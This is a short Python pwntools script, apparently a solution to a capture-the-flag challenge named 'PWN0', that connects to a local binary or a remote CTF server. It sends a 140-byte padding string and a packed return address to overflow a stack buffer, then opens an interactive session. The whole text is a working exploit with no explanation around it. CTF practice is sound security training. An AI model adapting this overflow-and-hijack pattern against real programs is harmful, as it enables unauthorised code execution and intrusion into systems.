from pwn import *
import sys

if len(sys.argv) == 1:
	p = process("./pwn0")
else:
	p = remote("icewall-ctf.kr", 24000)
pause()

payload  = "a"*140
payload += p32(0x08048514)

p.recvuntil("PWN0 by DelspoN")
p.send(payload + "\n")
p.interactive()
